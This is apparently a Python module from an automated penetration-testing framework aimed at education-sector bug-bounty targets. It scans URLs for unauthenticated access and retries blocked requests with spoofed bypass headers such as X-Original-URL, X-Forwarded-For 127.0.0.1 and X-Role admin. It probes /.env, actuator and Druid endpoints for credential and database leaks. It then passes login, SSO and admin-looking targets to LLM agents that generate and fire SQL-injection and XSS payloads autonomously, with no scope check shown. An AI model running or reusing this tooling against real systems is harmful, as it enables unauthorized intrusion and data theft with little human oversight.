"""L4 主动验证 — P1 级未授权访问与越权旁路检测 (UnauthScanner + LLM 自愈)

1. Phase 1: 常规规则探测 (UnauthScanner + AdvancedBypass)
2. Phase 2: LLM 网关判定 (config.enabled + token_budget + 卡点检测)
3. Phase 3: ReAct 自愈循环 + EduSRC 战报生成
"""

from __future__ import annotations

import asyncio
import json as _json
import logging
from dataclasses import asdict
from pathlib import Path
from urllib.parse import urljoin

import aiohttp
import yaml

from modules import register
from shared.models import Finding, FindingSource, VulnSeverity

_log = logging.getLogger(__name__)

# ── LLM 控本计数器 ──
_llm_token_used: int = 0


def _load_llm_config() -> dict:
    cfg_path = Path(__file__).resolve().parent.parent.parent / "orchestrator" / "config.yaml"
    if cfg_path.exists():
        with open(cfg_path) as f:
            return yaml.safe_load(f).get("llm", {})
    return {}


def _is_login_form(body: str) -> bool:
    """检测响应体是否为登录表单"""
    bl = body.lower()
    return ("<form" in bl and "password" in bl) or ("login" in bl and "password" in bl)

# AdvancedBypass — 4 层 Header 组合，遇 403 自动轮换
_BYPASS_COMBOS: list[dict[str, str]] = [
    # Tier 1: 伪造请求路径 (绕过 URL-based ACL)
    {"X-Original-URL": "/", "X-Rewrite-URL": "/"},
    # Tier 2: 伪造网关来源 (绕过 reverse-proxy 限制)
    {"X-Forwarded-Host": "127.0.0.1",
     "Forwarded": "for=127.0.0.1;proto=https",
     "X-Forwarded-Proto": "https"},
    # Tier 3: 伪造管理权限 (绕过 RBAC)
    {"X-Admin": "true", "X-Role": "admin",
     "X-Auth-Token": "admin", "X-Auth-User": "admin"},
    # Tier 4: 复合 IP 伪造 (绕过 IP whitelist)
    {"X-Client-IP": "127.0.0.1", "X-Original-For": "127.0.0.1",
     "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1",
     "X-Originating-IP": "127.0.0.1", "X-Remote-IP": "127.0.0.1"},
]

# ── 敏感信息关键词 (按类别) ──
# API 结构泄露
_API_STRUCT = [
    '"code":0', '"code": 0', '"success":true', '"success": true',
    '"total":', '"data":', '"list":', '"rows":', '"records":',
    '"result":', '"items":', '"body":',
]
# 凭据/隐私数据 (出现在 JSON 字段名中)
_PII_FIELDS = [
    '"username":', '"password":', '"passwd":', '"secret":',
    '"token":', '"accessKey":', '"access_token":', '"apiKey":',
    '"email":', '"phone":', '"mobile":', '"idCard":',
    '"realName":', '"address":', '"birthday":',
]
# 数据库/基础设施泄露
_INFRA_LEAK = [
    '"jdbc:', 'jdbc:mysql', 'jdbc:oracle', 'jdbc:postgresql',
    '"datasource":', '"connectionString":',
    'spring.datasource', 'mongodb://', 'redis://',
    'DB_HOST', 'DB_PASSWORD', 'APP_KEY',
]

# 额外探测的管理端点 (追加在目标 base URL 后)
_ADMIN_PATHS = [
    "/admin/", "/api/", "/actuator/health", "/actuator/env",
    "/druid/datasource.json", "/druid/index.html",
    "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
    "/.env",
]


def _is_sensitive(body: str, content_type: str) -> tuple[bool, list[str]]:
    """检测响应是否包含未授权敏感数据"""
    hits: list[str] = []
    body_lower = body.lower()

    # JSON 内容类型加成
    is_json = "application/json" in content_type.lower()

    for kw in _API_STRUCT:
        if kw.lower() in body_lower:
            hits.append(kw)
    for kw in _PII_FIELDS:
        if kw.lower() in body_lower:
            hits.append(kw)
    for kw in _INFRA_LEAK:
        if kw.lower() in body_lower:
            hits.append(kw)

    # 判定阈值: JSON 格式 + ≥1 个命中 或 ≥3 个命中
    if is_json and len(hits) >= 1:
        return True, hits
    if len(hits) >= 3:
        return True, hits
    return False, []


class UnauthScanner:
    """未授权访问与越权旁路检测扫描器

    用法:
        scanner = UnauthScanner(session, logger)
        findings = await scanner.scan(targets)
    """

    def __init__(self, session, logger):
        self.session = session
        self.logger = logger

    # ── public API ──

    async def scan(self, targets: list[dict]) -> list[Finding]:
        """对目标列表执行未授权访问检测"""
        candidates = self._select_targets(targets)
        if not candidates:
            self.logger.info("unauth_skip", reason="no_candidates")
            return []

        self.logger.info("unauth_start", candidate_count=len(candidates))

        sem = asyncio.Semaphore(5)
        findings: list[Finding] = []

        async def probe_one(target: dict):
            async with sem:
                results = await self._probe_target(target)
                findings.extend(results)

        await asyncio.gather(*[probe_one(t) for t in candidates])

        self.logger.info("unauth_done", total=len(findings))
        return findings

    # ── target selection ──

    @staticmethod
    def _select_targets(targets: list[dict]) -> list[dict]:
        """筛选高价值目标: /api/ /admin/ /system/ /user/ + is_login=False"""
        high_value = []
        for t in targets:
            url = t.get("url", "").lower()
            score = 0
            for frag in ("/api/", "/api/v", "/admin/", "/system/", "/user/",
                         "/manage/", "/console/", "/backend/"):
                if frag in url:
                    score += 2
            if not t.get("is_login", True):
                score += 1
            if score >= 1:
                high_value.append(t)
        return high_value

    # ── per-target probe ──

    async def _probe_target(self, target: dict) -> list[Finding]:
        """探测单个目标及其管理端点"""
        url = target.get("url", "")
        if not url:
            return []

        findings: list[Finding] = []

        # 1) 直接探测目标 URL (GET + POST)
        for method in ("GET", "POST"):
            f = await self._check_endpoint(url, method, bypass_used=False)
            if f:
                findings.append(f)

        # 2) 探测常见管理子路径 (仅 GET，限 5 条)
        for path in _ADMIN_PATHS[:5]:
            endpoint = urljoin(url.rstrip("/") + "/", path.lstrip("/"))
            f = await self._check_endpoint(endpoint, "GET", bypass_used=False)
            if f:
                findings.append(f)
                break  # 命中一条即止

        return findings

    async def _check_endpoint(self, url: str, method: str,
                              bypass_used: bool = False) -> Finding | None:
        """探测单个端点，遇 403 自动轮换 AdvancedBypass 四层 Header 组合"""
        hit, body, content_type, status = await self._request(url, method, {})

        # AdvancedBypass: 401/403 → 依序尝试 4 层 Header 组合
        bypass_tier = 0
        if not hit and status in (401, 403):
            for tier_idx, combo in enumerate(_BYPASS_COMBOS, 1):
                hit, body, content_type, status = await self._request(
                    url, method, combo
                )
                if hit:
                    bypass_used = True
                    bypass_tier = tier_idx
                    break

        if not hit:
            return None

        hits = _is_sensitive(body, content_type)[1]

        severity = VulnSeverity.HIGH
        for kw in hits:
            if any(leak in kw.lower() for leak in ("jdbc:", "password", "token",
                                                     "secret", "accesskey")):
                severity = VulnSeverity.CRITICAL
                break

        evidence = f"HTTP {status} method={method}"
        if bypass_used:
            tier_labels = {1: "path_forgery", 2: "gateway_forgery",
                          3: "auth_forgery", 4: "composite_ip"}
            evidence += f" bypass={tier_labels.get(bypass_tier, 'tier_%d'%bypass_tier)}"
        evidence += f" content_type={content_type[:60]} hits={hits[:6]}"

        return Finding(
            url=url,
            vuln_type="unauth",
            severity=severity,
            title=f"未授权访问: {url}",
            evidence=evidence,
            confidence=0.85 if len(hits) >= 3 else 0.65,
            source=FindingSource.L4_ACTIVE,
            source_module="unauth_check",
            raw={
                "method": method,
                "status_code": status,
                "bypass_used": bypass_used,
                "bypass_tier": bypass_tier,
                "content_type": content_type,
                "sensitive_hits": hits[:10],
                "body_preview": body[:300],
            },
        )

    async def _request(self, url: str, method: str,
                       extra_headers: dict) -> tuple[bool, str, str, int]:
        """发送零凭据请求，返回 (is_hit, body, content_type, status)"""
        try:
            if method == "POST":
                resp = await self.session.post(url, data="", headers=extra_headers)
            else:
                resp = await self.session.get(url, headers=extra_headers)
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            _log.debug("unauth_req_failed url=%s error=%s", url, e)
            return False, "", "", 0

        status = resp.status

        if status != 200:
            return False, "", "", status

        body = ""
        content_type = resp.headers.get("Content-Type", "")
        try:
            body = await resp.text()
            body = body[:65536]
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            _log.debug("unauth_body_failed url=%s error=%s", url, e)

        sensitive, _ = _is_sensitive(body, content_type)
        return sensitive, body, content_type, status


# ── 200 OK 深度扫描管线 ──

async def _deep_scan_200(target_url: str, body: str, session) -> list[Finding]:
    """200 OK 无卡点 → 攻击面提取 → LLM 生成 Payload → 开火评估"""
    findings: list[Finding] = []

    # 仅对含 HTML 的响应启动（跳过纯 JSON / 静态资源）
    ct_lower = body[:512].lower()
    if not ("<form" in ct_lower or "<input" in ct_lower or "?" in target_url):
        return findings

    try:
        from agent.attack_surface import extract_attack_surface
        from agent.payload_generator import generate_dynamic_payloads
        from agent.executor import execute_and_evaluate

        surface = await extract_attack_surface(body, target_url)
        if not surface["url_params"] and not surface["forms"]:
            return findings

        print(f"[*] 200深度扫描 → {target_url} (params={len(surface['url_params'])}, forms={len(surface['forms'])})")

        payloads = await generate_dynamic_payloads(target_url, surface)
        if not payloads:
            return findings

        results = await execute_and_evaluate(target_url, surface, payloads)

        for r in results:
            findings.append(Finding(
                url=target_url,
                vuln_type="sqli" if r.get("vulnerability_type", "").upper() in ("SQLI", "SQL") else "xss",
                severity=VulnSeverity.CRITICAL,
                title=f"{r['vulnerability_type']} @ {r['target_parameter']}: {target_url}",
                evidence=f"judge_conf={r['confidence']} evidence={r.get('evidence', '')} status={r['response_status']} elapsed={r['elapsed']}s",
                confidence=r["confidence"] / 100.0,
                source=FindingSource.L4_ACTIVE,
                source_module="unauth_check",
                raw={
                    "payload": r["payload"],
                    "judge_evidence": r.get("evidence", ""),
                    "response_status": r["response_status"],
                    "elapsed": r["elapsed"],
                },
            ))

    except ImportError as e:
        _log.warning("deep_scan_200 missing module: %s", e)
    except Exception as e:
        _log.error("deep_scan_200_failed url=%s error=%s", target_url, e)

    return findings


# ── 三阶段合流: check_unauth ──

async def check_unauth(target_url: str, session) -> dict:
    """对单个 URL 执行完整的三阶段未授权检测流水线。

    Returns:
        {"findings": list[Finding], "react_used": bool, "report_path": str|None}
    """
    findings: list[Finding] = []
    react_used = False
    report_path: str | None = None

    # ═══ Phase 1: 常规规则探测 (低成本) ═══
    body = ""
    status = 0
    content_type = ""

    # 基础 GET 探测
    try:
        resp = await session.get(target_url)
        status = resp.status
        content_type = resp.headers.get("Content-Type", "")
        body = await resp.text()
        body = body[:32768]
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        _log.debug("check_unauth_probe_failed url=%s error=%s", target_url, e)
        return {"findings": [], "react_used": False, "report_path": None}

    # 直接命中 → 记录漏洞，跳过 LLM
    if _is_sensitive(body, content_type)[0]:
        findings.append(Finding(
            url=target_url, vuln_type="unauth", severity=VulnSeverity.HIGH,
            title=f"未授权访问 (直接命中): {target_url}",
            evidence=f"HTTP {status} hits={_is_sensitive(body, content_type)[1][:5]}",
            confidence=0.85, source=FindingSource.L4_ACTIVE,
            source_module="unauth_check",
            raw={"method": "GET", "status_code": status, "content_type": content_type},
        ))
        return {"findings": findings, "react_used": False, "report_path": None}

    # 403/500 或 200+登录表单 → 卡点，进入 Phase 2
    is_blocked = status in (403, 500)
    is_login_page = status == 200 and _is_login_form(body)

    if not is_blocked and not is_login_page:
        # 无直接卡点 → 尝试探测管理子路径
        found_block = False
        for admin_path in ("/admin", "/admin/login", "/manage", "/api", "/system", "/console"):
            admin_url = urljoin(target_url.rstrip("/") + "/", admin_path.lstrip("/"))
            h2, b2, ct2, s2 = await _raw_request(session, admin_url, "GET", {})
            if s2 in (403, 401, 500) or (s2 == 200 and _is_login_form(b2)):
                target_url = admin_url
                body, status, content_type = b2, s2, ct2
                is_blocked = status in (403, 500)
                is_login_page = status == 200 and _is_login_form(body)
                found_block = True
                break
        if not found_block:
            # 200 OK 无卡点 → 攻击面提取 + LLM Payload + 开火评估
            findings = await _deep_scan_200(target_url, body, session)
            # 若仍未命中，AdvancedBypass 收尾
            if not findings:
                for tier_idx, combo in enumerate(_BYPASS_COMBOS, 1):
                    hit2, b2, ct2, s2 = await _raw_request(session, target_url, "GET", combo)
                    if hit2:
                        findings.append(Finding(
                            url=target_url, vuln_type="unauth",
                            severity=VulnSeverity.HIGH,
                            title=f"未授权访问 (绕过 Tier {tier_idx}): {target_url}",
                            evidence=f"HTTP {s2} bypass=tier_{tier_idx}",
                            confidence=0.75, source=FindingSource.L4_ACTIVE,
                            source_module="unauth_check",
                            raw={"bypass_tier": tier_idx, "status_code": s2},
                        ))
                        break
            return {"findings": findings, "react_used": False, "report_path": None}

    # ═══ Phase 2: LLM 网关判定 ═══
    global _llm_token_used
    llm_cfg = _load_llm_config()

    llm_enabled = llm_cfg.get("enabled", False)
    token_budget = llm_cfg.get("total_token_budget", 500000)
    max_steps = llm_cfg.get("max_react_steps", 4)

    if not llm_enabled or _llm_token_used >= token_budget:
        reason = "disabled" if not llm_enabled else "token_budget_exhausted"
        print(f"[-] LLM 自愈未激活或Token预算耗尽 ({reason}), 跳过智能绕过, 转为常规漏洞记录。")
        _log.info("llm_fallback target=%s reason=%s", target_url, reason)
        return {"findings": findings, "react_used": False, "report_path": None}

    # ═══ Phase 3: ReAct 自愈 + 战报收割 ═══
    print(f"[+] 激活 LLM 自愈大脑 → {target_url} (卡点: {'403/500' if is_blocked else 'login_form'})")

    try:
        from agent.react_core import run_exploit_loop
        from agent.report_generator import compile_src_report

        react_result = await run_exploit_loop(
            target_url=target_url,
            attack_type="unauth_bypass",
            max_steps=min(max_steps, 5),
        )

        react_used = True
        _llm_token_used += react_result["steps"] * 15000  # 估算每步 ~15K tokens

        if react_result["success"]:
            findings.append(Finding(
                url=target_url, vuln_type="unauth",
                severity=VulnSeverity.HIGH,
                title=f"LLM 自愈绕过: {target_url}",
                evidence=react_result["summary"][:500],
                confidence=0.90, source=FindingSource.L4_ACTIVE,
                source_module="unauth_check",
                raw={"react_steps": react_result["steps"], "react_summary": react_result["summary"]},
            ))

            # 自动生成战报
            report_md = await compile_src_report(
                history=react_result["history"],
                target_url=target_url,
            )
            out_dir = Path(__file__).resolve().parent.parent.parent / "data" / "reports"
            out_dir.mkdir(parents=True, exist_ok=True)
            report_file = out_dir / f"unauth_{target_url.replace('://','_').replace('/','_')[:60]}.md"
            report_file.write_text(report_md, encoding="utf-8")
            report_path = str(report_file)
            _log.info("llm_report_saved path=%s", report_path)

    except ImportError:
        _log.warning("agent modules not available, skipping LLM react")
    except Exception as e:
        _log.error("react_loop_failed url=%s error=%s", target_url, e)

    return {"findings": findings, "react_used": react_used, "report_path": report_path}


async def _raw_request(session, url: str, method: str, headers: dict) -> tuple[bool, str, str, int]:
    """独立于 UnauthScanner 的低级请求 helper"""
    try:
        if method == "POST":
            resp = await session.post(url, data="", headers=headers)
        else:
            resp = await session.get(url, headers=headers)
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return False, "", "", 0
    status = resp.status
    if status != 200:
        return False, "", "", status
    try:
        body = await resp.text()
        body = body[:65536]
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return False, "", "", status
    ct = resp.headers.get("Content-Type", "")
    hit, _ = _is_sensitive(body, ct)
    return hit, body, ct, status


# ── 模块入口 ──

@register("unauth_check")
async def run(context: dict) -> dict:
    targets: list[dict] = context.get("targets", [])
    session = context["session"]
    logger = context["logger"]
    all_findings: list[Finding] = []

    # ── 全局记忆初始化 (Task 1: 赛博义体) ──
    try:
        from agent.memory import AgentMemory
        memory = AgentMemory.get()
        context["memory"] = memory
        logger.info("agent_memory_loaded keys=%d", len(memory.all()))
    except ImportError:
        memory = None

    # 快速路径: UnauthScanner 批量常规扫描
    scanner = UnauthScanner(session, logger)
    fast_findings = await scanner.scan(targets)
    fast_urls = {f.url for f in fast_findings}
    all_findings.extend(fast_findings)

    # 智能路径: autonomous_pentest 自主渗透 (LLM 主驾驶)
    admin_kw = ("manager", "admin", "oa", "idp", "cas", "sso", "jwgl",
                "auth", "portal", "gateway", "console", "lib", "mail", "login")
    high_value = [
        t for t in targets
        if t.get("url", "") not in fast_urls
        and any(kw in t.get("url", "").lower() for kw in admin_kw)
    ]
    for target in high_value[:5]:
        url = target.get("url", "")
        if not url:
            continue
        logger.info("pentest_agent_start url=%s", url)
        try:
            from agent.pentest_agent import autonomous_pentest
            from agent.report_generator import compile_src_report

            result = await autonomous_pentest(target_url=url, max_steps=8)

            if result["success"]:
                all_findings.append(Finding(
                    url=url, vuln_type="unauth", severity=VulnSeverity.HIGH,
                    title=f"Agent自主利用: {url}",
                    evidence=result["summary"][:500], confidence=0.90,
                    source=FindingSource.L4_ACTIVE, source_module="unauth_check",
                    raw={"status": result["status"], "steps": result["steps"]},
                ))
                report_md = await compile_src_report(
                    history=result["history"], target_url=url)
                out_dir = Path(__file__).resolve().parent.parent.parent / "data" / "reports"
                out_dir.mkdir(parents=True, exist_ok=True)
                (out_dir / f"pentest_{url.replace('://','_').replace('/','_')[:60]}.md").write_text(
                    report_md, encoding="utf-8")
                logger.info("pentest_report_saved url=%s", url)

            logger.info("pentest_done url=%s success=%s steps=%d",
                        url, result["success"], result["steps"])
        except ImportError:
            _log.warning("agent modules unavailable, skip pentest")
        except Exception as e:
            _log.error("pentest_crashed url=%s error=%s", url, e)

    # 200 OK 深度扫描管线: 对未命中目标做 SQLi/XSS payload 测试
    # 💸 弹药库保护: 深度扫描限 5 个目标，单次最多 ~150K tokens
    max_deep = _load_llm_config().get("max_deep_scan_targets", 5)
    already_scanned = {f.url for f in all_findings}
    unscanned = [t for t in targets
                 if t.get("url", "") not in already_scanned
                 and t.get("url", "").startswith("http")]
    if len(unscanned) > max_deep:
        print(f"[BudgetGate] 深度扫描目标 {len(unscanned)} → 限额 {max_deep}，截断 "
              f"(预估 Token: ~{max_deep * 3 * 30000:,} tokens)")
    for target in unscanned[:max_deep]:
        url = target.get("url", "")
        try:
            resp = await session.get(url)
            body = await resp.text()
        except Exception:
            continue
        deep_findings = await _deep_scan_200(url, body, session)
        all_findings.extend(deep_findings)
        if deep_findings:
            logger.info("deep_scan_200_hit url=%s count=%d", url, len(deep_findings))

    logger.info("unauth_done total=%d", len(all_findings))
    return {"findings": [asdict(f) for f in all_findings]}
